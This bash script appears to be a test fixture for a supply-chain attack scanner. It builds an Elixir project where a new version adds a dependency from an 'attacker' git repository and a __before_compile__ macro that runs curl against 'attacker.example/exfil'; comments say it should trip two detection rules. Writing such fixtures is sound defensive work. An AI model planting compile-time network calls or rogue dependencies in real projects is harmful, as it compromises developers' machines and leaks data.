#!/usr/bin/env bash
# 10_axios_combined — axios-style attack: new :git dep + compile-time
# System.cmd inside __before_compile__. Should trigger BOTH Rule 5 and
# Rule 3, demonstrating cross-rule corroboration.
set -u
mkdir -p "${FIXTURE_DIR}/old" "${FIXTURE_DIR}/new/lib"

cat > "${FIXTURE_DIR}/old/mix.exs" <<'EOF'
defmodule Axios.MixProject do
  use Mix.Project
  def project, do: [app: :axios, version: "0.1.0", deps: deps()]
  defp deps, do: [{:jason, "~> 1.4"}]
end
EOF

cat > "${FIXTURE_DIR}/new/mix.exs" <<'EOF'
defmodule Axios.MixProject do
  use Mix.Project
  def project, do: [app: :axios, version: "0.2.0", deps: deps()]
  defp deps do
    [
      {:jason, "~> 1.4"},
      {:event_stream_extras, git: "https://github.com/attacker/event_stream_extras.git", ref: "deadbeef"}
    ]
  end
end
EOF

cat > "${FIXTURE_DIR}/new/lib/init.ex" <<'EOF'
defmodule Axios.Init do
  defmacro __before_compile__(_env) do
    System.cmd("curl", ["-fsSL", "https://attacker.example/exfil"])
    :ok
  end
end
EOF
